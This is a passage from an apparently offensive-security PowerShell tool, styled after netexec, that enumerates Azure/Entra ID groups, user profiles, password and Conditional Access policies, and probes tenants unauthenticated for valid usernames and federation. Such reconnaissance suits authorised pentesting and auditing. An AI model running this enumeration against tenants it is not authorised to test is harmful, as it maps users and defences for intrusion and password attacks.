    if ($validUsers.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Valid Usernames Found:" -Color "Green"
        foreach ($validUser in $validUsers) {
            $authType = switch ($validUser.IfExistsResult) {
                0 { "Managed" }
                5 { "Alternate" }
                6 { "Federated" }
                default { "Unknown" }
            }
            Write-ColorOutput -Message "    [+] $($validUser.Username) ($authType)" -Color "Green"
        }
    }
}

# Format group output like netexec
function Format-GroupOutput {
    param(
        [PSCustomObject]$Group,
        [int]$MemberCount = 0
    )
    
    # Group name
    $groupName = if ($Group.DisplayName) { $Group.DisplayName } else { "UNKNOWN" }
    
    # Truncate long group names for column display
    $maxNameLength = 35
    $displayName = if ($groupName.Length -gt $maxNameLength) {
        $groupName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $groupName
    }
    
    # Use group ID as "IP" equivalent (first 15 chars for alignment)
    $groupIdShort = if ($Group.Id) { 
        $Group.Id.Substring(0, [Math]::Min(15, $Group.Id.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # Group type and security status
    $groupTypes = if ($Group.GroupTypes -and $Group.GroupTypes.Count -gt 0) {
        $Group.GroupTypes -join ","
    } else {
        "Security"
    }
    
    $securityEnabled = if ($Group.SecurityEnabled) { "True" } else { "False" }
    $mailEnabled = if ($Group.MailEnabled) { "True" } else { "False" }
    
    # Description
    $description = if ($Group.Description) { 
        if ($Group.Description.Length -gt 50) {
            $Group.Description.Substring(0, 47) + "..."
        } else {
            $Group.Description
        }
    } else { 
        "No description" 
    }
    
    $output = "AZR".PadRight(12) + 
              $groupIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayName.PadRight(38) + 
              "[*] (name:$groupName) (type:$groupTypes) (security:$securityEnabled) (mail:$mailEnabled) (members:$MemberCount) (desc:$description)"
    
    # Color based on type
    $color = "Cyan"
    if ($Group.SecurityEnabled) {
        $color = "Green"  # Security groups in green
    } elseif ($Group.MailEnabled) {
        $color = "Yellow"  # Mail-enabled groups in yellow
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Get group member count
function Get-GroupMemberCount {
    param(
        [string]$GroupId
    )
    
    try {
        $members = Get-MgGroupMember -GroupId $GroupId -ErrorAction SilentlyContinue
        if ($members) {
            return $members.Count
        }
    } catch {
        return 0
    }
    
    return 0
}

# Main group enumeration function
function Invoke-GroupEnumeration {
    param(
        [bool]$ShowMembers,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Group Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Group Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --groups`n" -Color "Yellow"
    
    # Get all groups
    Write-ColorOutput -Message "[*] Retrieving groups from Azure/Entra ID..." -Color "Yellow"
    
    try {
        $allGroups = Get-MgGroup -All -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allGroups.Count) total groups`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve groups: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Group.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to group enumeration" -Color "Yellow"
        return
    }
    
    if ($allGroups.Count -eq 0) {
        Write-ColorOutput -Message "[!] No groups found or insufficient permissions" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($allGroups.Count) groups`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate groups
    foreach ($group in $allGroups) {
        $memberCount = 0
        if ($ShowMembers) {
            $memberCount = Get-GroupMemberCount -GroupId $group.Id
        }
        
        Format-GroupOutput -Group $group -MemberCount $memberCount
        
        # Collect for export
        if ($ExportPath) {
            $exportData += [PSCustomObject]@{
                GroupId          = $group.Id
                DisplayName      = $group.DisplayName
                Description      = $group.Description
                GroupTypes       = ($group.GroupTypes -join ",")
                SecurityEnabled  = $group.SecurityEnabled
                MailEnabled      = $group.MailEnabled
                Mail             = $group.Mail
                MailNickname     = $group.MailNickname
                CreatedDateTime  = $group.CreatedDateTime
                MemberCount      = $memberCount
            }
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            }
            
            Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Group enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Groups: $($allGroups.Count)" -Color "Cyan"
    
    $securityGroups = ($allGroups | Where-Object { $_.SecurityEnabled -eq $true }).Count
    $mailEnabledGroups = ($allGroups | Where-Object { $_.MailEnabled -eq $true }).Count
    $unifiedGroups = ($allGroups | Where-Object { $_.GroupTypes -contains "Unified" }).Count
    $dynamicGroups = ($allGroups | Where-Object { $_.GroupTypes -contains "DynamicMembership" }).Count
    
    Write-ColorOutput -Message "    Security Groups: $securityGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Mail-Enabled Groups: $mailEnabledGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Microsoft 365 Groups: $unifiedGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Dynamic Groups: $dynamicGroups" -Color "Cyan"
}

# Format user profile output like netexec
function Format-UserProfileOutput {
    param(
        [PSCustomObject]$User
    )
    
    # User display name
    $displayName = if ($User.DisplayName) { $User.DisplayName } else { "UNKNOWN" }
    
    # Truncate long names for column display
    $maxNameLength = 35
    $displayNameShort = if ($displayName.Length -gt $maxNameLength) {
        $displayName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $displayName
    }
    
    # Use first 15 chars of user ID for alignment
    $userIdShort = if ($User.Id) { 
        $User.Id.Substring(0, [Math]::Min(15, $User.Id.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # User Principal Name
    $upn = if ($User.UserPrincipalName) { $User.UserPrincipalName } else { "N/A" }
    
    # Job title
    $jobTitle = if ($User.JobTitle) { $User.JobTitle } else { "N/A" }
    
    # Department
    $department = if ($User.Department) { $User.Department } else { "N/A" }
    
    # User type (Member or Guest)
    $userType = if ($User.UserType) { $User.UserType } else { "Member" }
    
    # Account enabled status
    $accountEnabled = if ($User.AccountEnabled) { "Enabled" } else { "Disabled" }
    
    # Office location
    $officeLocation = if ($User.OfficeLocation) { $User.OfficeLocation } else { "N/A" }
    
    # Last sign-in date
    $lastSignIn = if ($User.SignInActivity -and $User.SignInActivity.LastSignInDateTime) { 
        $User.SignInActivity.LastSignInDateTime.ToString("yyyy-MM-dd")
    } else { 
        "Never/Unknown" 
    }
    
    $output = "AZR".PadRight(12) + 
              $userIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayNameShort.PadRight(38) + 
              "[*] (upn:$upn) (job:$jobTitle) (dept:$department) (type:$userType) (status:$accountEnabled) (location:$officeLocation) (lastSignIn:$lastSignIn)"
    
    # Color based on user type and status
    $color = "Cyan"
    if ($userType -eq "Guest") {
        $color = "Yellow"  # Guest users in yellow
    } elseif ($accountEnabled -eq "Disabled") {
        $color = "DarkGray"  # Disabled users in gray
    } else {
        $color = "Green"  # Active member users in green
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Main user profile enumeration function
function Invoke-UserProfileEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra User Profile Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: User Profile Enumeration (Authenticated)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: Microsoft Graph API with current user permissions`n" -Color "Yellow"
    
    # Get context to display current user info
    $context = Get-MgContext
    if ($context) {
        Write-ColorOutput -Message "[*] Authenticated as: $($context.Account)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Tenant: $($context.TenantId)`n" -Color "Cyan"
    }
    
    # Get all users
    Write-ColorOutput -Message "[*] Retrieving user profiles from Azure/Entra ID..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while for large organizations...`n" -Color "Yellow"
    
    try {
        # Try to get users with sign-in activity (requires AuditLog.Read.All)
        # If that fails, fall back to basic user info
        $allUsers = @()
        
        try {
            Write-ColorOutput -Message "[*] Attempting to retrieve users with sign-in activity..." -Color "Yellow"
            $allUsers = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName,JobTitle,Department,UserType,AccountEnabled,OfficeLocation,Mail,SignInActivity" -ErrorAction Stop
            Write-ColorOutput -Message "[+] Retrieved $($allUsers.Count) users with sign-in activity`n" -Color "Green"
        } catch {
            # Fall back to basic properties if sign-in activity is not available
            Write-ColorOutput -Message "[!] Could not retrieve sign-in activity (requires AuditLog.Read.All)" -Color "Yellow"
            Write-ColorOutput -Message "[*] Falling back to basic user properties...`n" -Color "Yellow"
            $allUsers = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName,JobTitle,Department,UserType,AccountEnabled,OfficeLocation,Mail" -ErrorAction Stop
            Write-ColorOutput -Message "[+] Retrieved $($allUsers.Count) users`n" -Color "Green"
        }
        
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve users: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have User.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to user enumeration" -Color "Yellow"
        return
    }
    
    if ($allUsers.Count -eq 0) {
        Write-ColorOutput -Message "[!] No users found or insufficient permissions" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($allUsers.Count) users`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate users
    foreach ($user in $allUsers) {
        Format-UserProfileOutput -User $user
        
        # Collect for export
        if ($ExportPath) {
            $lastSignIn = if ($user.SignInActivity -and $user.SignInActivity.LastSignInDateTime) {
                $user.SignInActivity.LastSignInDateTime
            } else {
                $null
            }
            
            $exportData += [PSCustomObject]@{
                UserId              = $user.Id
                DisplayName         = $user.DisplayName
                UserPrincipalName   = $user.UserPrincipalName
                Mail                = $user.Mail
                JobTitle            = $user.JobTitle
                Department          = $user.Department
                OfficeLocation      = $user.OfficeLocation
                UserType            = $user.UserType
                AccountEnabled      = $user.AccountEnabled
                LastSignInDateTime  = $lastSignIn
            }
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            }
            
            Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] User profile enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Users: $($allUsers.Count)" -Color "Cyan"
    
    $memberUsers = ($allUsers | Where-Object { $_.UserType -eq "Member" -or -not $_.UserType }).Count
    $guestUsers = ($allUsers | Where-Object { $_.UserType -eq "Guest" }).Count
    $enabledUsers = ($allUsers | Where-Object { $_.AccountEnabled -eq $true }).Count
    $disabledUsers = ($allUsers | Where-Object { $_.AccountEnabled -eq $false }).Count
    
    Write-ColorOutput -Message "    Member Users: $memberUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Guest Users: $guestUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Enabled Accounts: $enabledUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Disabled Accounts: $disabledUsers" -Color "Cyan"
}

# Main password policy enumeration function
function Invoke-PasswordPolicyEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Password Policy Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Password Policy" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --pass-pol`n" -Color "Yellow"
    
    # Get organization/tenant information
    Write-ColorOutput -Message "[*] Retrieving tenant password policies..." -Color "Yellow"
    
    $policyData = @{
        TenantId = $null
        TenantDisplayName = $null
        PasswordPolicies = @{}
        SecurityDefaults = $null
        ConditionalAccessPolicies = @()
        AuthenticationMethods = @{}
    }
    
    try {
        # Get organization details
        $org = Get-MgOrganization -ErrorAction Stop
        
        if ($org) {
            $policyData.TenantId = $org.Id
            $policyData.TenantDisplayName = $org.DisplayName
            
            Write-ColorOutput -Message "[+] Tenant: $($org.DisplayName) ($($org.Id))`n" -Color "Green"
            
            # Display password policies
            Write-ColorOutput -Message "AZR".PadRight(12) + $org.DisplayName.PadRight(35) + "443".PadRight(7) + "[*] Password Policy Information" -Color "Cyan"
            Write-ColorOutput -Message ""
            
            # Password validity period
            if ($org.PasswordValidityPeriodInDays) {
                Write-ColorOutput -Message "    [+] Password Validity Period:     $($org.PasswordValidityPeriodInDays) days" -Color "Green"
                $policyData.PasswordPolicies.ValidityPeriodDays = $org.PasswordValidityPeriodInDays
            }
            
            # Password notification window
            if ($org.PasswordNotificationWindowInDays) {
                Write-ColorOutput -Message "    [+] Password Notification Window: $($org.PasswordNotificationWindowInDays) days" -Color "Cyan"
                $policyData.PasswordPolicies.NotificationWindowDays = $org.PasswordNotificationWindowInDays
            }
            
            # Verified domains
            if ($org.VerifiedDomains) {
                Write-ColorOutput -Message "    [+] Verified Domains:             $($org.VerifiedDomains.Count) domain(s)" -Color "Cyan"
                foreach ($domain in $org.VerifiedDomains) {
                    $isDefault = if ($domain.IsDefault) { " (Default)" } else { "" }
                    $isInitial = if ($domain.IsInitial) { " (Initial)" } else { "" }
                    Write-ColorOutput -Message "        - $($domain.Name)$isDefault$isInitial" -Color "DarkGray"
                }
            }
            
            # Technical notification emails
            if ($org.TechnicalNotificationMails) {
                Write-ColorOutput -Message "    [+] Technical Notification Emails: $($org.TechnicalNotificationMails.Count)" -Color "Cyan"
                foreach ($email in $org.TechnicalNotificationMails) {
                    Write-ColorOutput -Message "        - $email" -Color "DarkGray"
                }
            }
            
            # Security contacts
            if ($org.SecurityComplianceNotificationMails) {
                Write-ColorOutput -Message "    [+] Security Notification Emails:  $($org.SecurityComplianceNotificationMails.Count)" -Color "Cyan"
                foreach ($email in $org.SecurityComplianceNotificationMails) {
                    Write-ColorOutput -Message "        - $email" -Color "DarkGray"
                }
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read organization details" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Organization.Read.All or Directory.Read.All permissions" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve organization details" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to get domain password policies
    Write-ColorOutput -Message "`n[*] Retrieving domain password policies..." -Color "Yellow"
    
    try {
        $domains = Get-MgDomain -All -ErrorAction Stop
        
        if ($domains) {
            Write-ColorOutput -Message "[+] Found $($domains.Count) domain(s)`n" -Color "Green"
            
            foreach ($domain in $domains) {
                Write-ColorOutput -Message "    [*] Domain: $($domain.Id)" -Color "Yellow"
                
                # Password validity period for the domain
                if ($domain.PasswordValidityPeriodInDays) {
                    Write-ColorOutput -Message "        Password Expiry: $($domain.PasswordValidityPeriodInDays) days" -Color "Cyan"
                }
                
                if ($domain.PasswordNotificationWindowInDays) {
                    Write-ColorOutput -Message "        Notification Window: $($domain.PasswordNotificationWindowInDays) days" -Color "Cyan"
                }
                
                if ($domain.IsDefault) {
                    Write-ColorOutput -Message "        [+] This is the DEFAULT domain" -Color "Green"
                }
                
                if ($domain.IsInitial) {
                    Write-ColorOutput -Message "        [+] This is the INITIAL domain" -Color "Green"
                }
                
                if ($domain.IsVerified) {
                    Write-ColorOutput -Message "        [+] Domain is VERIFIED" -Color "Green"
                } else {
                    Write-ColorOutput -Message "        [!] Domain is NOT verified" -Color "Yellow"
                }
                
                if ($domain.SupportedServices) {
                    Write-ColorOutput -Message "        Supported Services: $($domain.SupportedServices -join ', ')" -Color "DarkGray"
                }
                
                Write-ColorOutput -Message ""
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read domain policies" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Directory.Read.All permissions" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve domain policies" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to get authentication methods policy
    Write-ColorOutput -Message "[*] Retrieving authentication methods policy..." -Color "Yellow"
    
    try {
        $authMethods = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy" -Method GET -ErrorAction Stop
        
        if ($authMethods) {
            Write-ColorOutput -Message "[+] Authentication methods policy retrieved`n" -Color "Green"
            
            # Registration enforcement
            if ($authMethods.registrationEnforcement) {
                $authRequired = $authMethods.registrationEnforcement.authenticationMethodsRegistrationCampaign
                if ($authRequired) {
                    Write-ColorOutput -Message "    [*] MFA Registration Campaign:" -Color "Yellow"
                    Write-ColorOutput -Message "        State: $($authRequired.state)" -Color "Cyan"
                    if ($authRequired.snoozeDurationInDays) {
                        Write-ColorOutput -Message "        Snooze Duration: $($authRequired.snoozeDurationInDays) days" -Color "Cyan"
                    }
                }
            }
            
            # Authentication method configurations
            if ($authMethods.authenticationMethodConfigurations) {
                Write-ColorOutput -Message "`n    [*] Enabled Authentication Methods:" -Color "Yellow"
                
                foreach ($method in $authMethods.authenticationMethodConfigurations) {
                    if ($method.state -eq "enabled") {
                        $methodType = switch ($method.'@odata.type') {
                            "#microsoft.graph.fido2AuthenticationMethodConfiguration" { "FIDO2 Security Key" }
                            "#microsoft.graph.microsoftAuthenticatorAuthenticationMethodConfiguration" { "Microsoft Authenticator" }
                            "#microsoft.graph.smsAuthenticationMethodConfiguration" { "SMS" }
                            "#microsoft.graph.voiceAuthenticationMethodConfiguration" { "Voice Call" }
                            "#microsoft.graph.emailAuthenticationMethodConfiguration" { "Email OTP" }
                            "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration" { "Temporary Access Pass" }
                            "#microsoft.graph.softwareOathAuthenticationMethodConfiguration" { "Software OATH Token" }
                            default { $method.'@odata.type' -replace '#microsoft\.graph\.', '' -replace 'AuthenticationMethodConfiguration', '' }
                        }
                        Write-ColorOutput -Message "        [+] $methodType (Enabled)" -Color "Green"
                        
                        $policyData.AuthenticationMethods[$methodType] = "Enabled"
                    }
                }
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read authentication methods policy" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve authentication methods policy" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to check if Security Defaults are enabled
    Write-ColorOutput -Message "`n[*] Checking Security Defaults status..." -Color "Yellow"
    
    try {
        $identitySecurityDefaults = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" -Method GET -ErrorAction Stop
        
        if ($identitySecurityDefaults) {
            $isEnabled = $identitySecurityDefaults.isEnabled
            $policyData.SecurityDefaults = $isEnabled
            
            if ($isEnabled) {
                Write-ColorOutput -Message "[+] Security Defaults: ENABLED" -Color "Green"
                Write-ColorOutput -Message "    [*] This enforces MFA for administrators and users when needed" -Color "Cyan"
            } else {
                Write-ColorOutput -Message "[!] Security Defaults: DISABLED" -Color "Yellow"
                Write-ColorOutput -Message "    [!] Consider using Conditional Access Policies or enable Security Defaults" -Color "Yellow"
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read Security Defaults status" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to check Security Defaults" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to enumerate Conditional Access Policies
    Write-ColorOutput -Message "`n[*] Enumerating Conditional Access Policies..." -Color "Yellow"
    
    try {
        $caPolicies = Get-MgIdentityConditionalAccessPolicy -All -ErrorAction Stop
        
        if ($caPolicies) {
            Write-ColorOutput -Message "[+] Found $($caPolicies.Count) Conditional Access Policies`n" -Color "Green"
            
            $enabledCount = 0
            $reportOnlyCount = 0
            $disabledCount = 0
            
            foreach ($policy in $caPolicies) {
                $stateColor = switch ($policy.State) {
                    "enabled" { 
                        $enabledCount++
                        "Green" 
                    }
                    "enabledForReportingButNotEnforced" { 
                        $reportOnlyCount++
                        "Yellow" 
                    }
                    "disabled" { 
                        $disabledCount++
                        "DarkGray" 
                    }
                    default { "Cyan" }
                }
                
                Write-ColorOutput -Message "    [$($policy.State.ToUpper())] $($policy.DisplayName)" -Color $stateColor
                
                if ($policy.Conditions) {
                    # Show if it requires MFA
                    if ($policy.GrantControls -and $policy.GrantControls.BuiltInControls -contains "mfa") {
                        Write-ColorOutput -Message "        [+] Requires MFA" -Color "Green"
                    }
                    
                    # Show application/user scope
                    if ($policy.Conditions.Applications) {
                        $appScope = if ($policy.Conditions.Applications.IncludeApplications -contains "All") {
                            "All Applications"
                        } else {
                            "$($policy.Conditions.Applications.IncludeApplications.Count) Applications"
                        }
                        Write-ColorOutput -Message "        Scope: $appScope" -Color "DarkGray"
                    }
                }
                
                $policyData.ConditionalAccessPolicies += [PSCustomObject]@{
                    DisplayName = $policy.DisplayName
                    State = $policy.State
                    CreatedDateTime = $policy.CreatedDateTime
                    ModifiedDateTime = $policy.ModifiedDateTime
                }
            }
            
            Write-ColorOutput -Message "`n    [*] CA Policy Summary:" -Color "Yellow"
            Write-ColorOutput -Message "        Enabled: $enabledCount" -Color "Green"
            Write-ColorOutput -Message "        Report-Only: $reportOnlyCount" -Color "Yellow"
            Write-ColorOutput -Message "        Disabled: $disabledCount" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] No Conditional Access Policies found" -Color "Yellow"
            Write-ColorOutput -Message "    [!] Consider implementing Conditional Access for enhanced security" -Color "Yellow"
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*" -or $_.Exception.Message -like "*Unauthorized*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read Conditional Access Policies" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information (expected behavior)" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to enumerate Conditional Access Policies" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                # For CSV, flatten the data
                $exportData = [PSCustomObject]@{
                    TenantId = $policyData.TenantId
                    TenantDisplayName = $policyData.TenantDisplayName
                    PasswordValidityDays = $policyData.PasswordPolicies.ValidityPeriodDays
                    PasswordNotificationDays = $policyData.PasswordPolicies.NotificationWindowDays
                    SecurityDefaultsEnabled = $policyData.SecurityDefaults
                    ConditionalAccessPolicyCount = $policyData.ConditionalAccessPolicies.Count
                }
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            } else {
                # Default to JSON for complex data
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            }
            
            Write-ColorOutput -Message "`n[+] Policy information exported to: $ExportPath" -Color "Green"
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Password policy enumeration complete!" -Color "Green"
    
    # Display access summary
    Write-ColorOutput -Message "`n[*] Access Summary:" -Color "Yellow"
    
    $hasOrgDetails = $policyData.TenantId -ne $null
    $hasAuthMethods = $policyData.AuthenticationMethods.Count -gt 0
    $hasSecurityDefaults = $policyData.SecurityDefaults -ne $null
    $hasCAPolicies = $policyData.ConditionalAccessPolicies.Count -gt 0
    
    if ($hasOrgDetails) {
        Write-ColorOutput -Message "    [+] Organization details: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Organization details: Not accessible" -Color "DarkGray"
    }
    
    if ($hasAuthMethods) {
        Write-ColorOutput -Message "    [+] Authentication methods: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Authentication methods: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    if ($hasSecurityDefaults) {
        Write-ColorOutput -Message "    [+] Security Defaults: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Security Defaults: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    if ($hasCAPolicies) {
        Write-ColorOutput -Message "    [+] Conditional Access Policies: Retrieved ($($policyData.ConditionalAccessPolicies.Count) policies)" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Conditional Access Policies: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    # Provide guidance based on what was accessible
    if (-not $hasAuthMethods -and -not $hasSecurityDefaults -and -not $hasCAPolicies) {
        Write-ColorOutput -Message "`n[*] Limited information retrieved - this is expected for:" -Color "Yellow"
        Write-ColorOutput -Message "    - Guest users (restricted by design)" -Color "Cyan"
        Write-ColorOutput -Message "    - Users without Policy.Read.All permissions" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] To get full policy information:" -Color "Yellow"
        Write-ColorOutput -Message "    1. Request Policy.Read.All permissions from your admin" -Color "Cyan"
        Write-ColorOutput -Message "    2. Or use a member account with appropriate permissions" -Color "Cyan"
    }
}

# Test if a tenant allows guest/external authentication (unauthenticated check)
function Test-GuestLoginEnabled {
    param(
        [string]$Domain
    )
    
    $result = [PSCustomObject]@{
        Domain = $Domain
        TenantExists = $false
        AcceptsExternalUsers = $false
        FederationType = "Unknown"
        AuthUrl = $null
        CloudInstanceName = $null
        NameSpaceType = $null
        DomainName = $null
        IsFederated = $false
        ThrottleStatus = $null
        Error = $null
    }
    
    try {
        # Method 1: Use GetCredentialType to check if external users are accepted
        # This checks what happens when we try to authenticate with an email from this domain
        $testEmail = "guesttest_$([guid]::NewGuid().ToString().Substring(0,8))@$Domain"
        
        $body = @{
            username = $testEmail
            isOtherIdpSupported = $true
            checkPhones = $false
            isRemoteNGCSupported = $true
            isCookieBannerShown = $false
            isFidoSupported = $true
            forceotclogin = $false
            otclogindisallowed = $false
            isExternalFederationDisallowed = $false
            isRemoteConnectSupported = $false
            federationFlags = 0
            isSignup = $false
            flowToken = ""
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        $result.TenantExists = $true
        $result.ThrottleStatus = $response.ThrottleStatus
        
        # Check if federation/external identity is supported
        if ($response.EstsProperties) {
            if ($response.EstsProperties.DomainType) {
                $result.NameSpaceType = $response.EstsProperties.DomainType
            }
        }
        
        # Check credentials type - this tells us about federation
        if ($response.Credentials) {
            if ($response.Credentials.FederationRedirectUrl) {
                $result.IsFederated = $true
                $result.AuthUrl = $response.Credentials.FederationRedirectUrl
            }
        }
        
        # Method 2: Check OpenID config for more details
        $openIdUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdUrl -Method Get -ErrorAction Stop
            
            if ($openIdConfig.issuer) {
                $result.TenantExists = $true
                
                if ($openIdConfig.tenant_region_scope) {
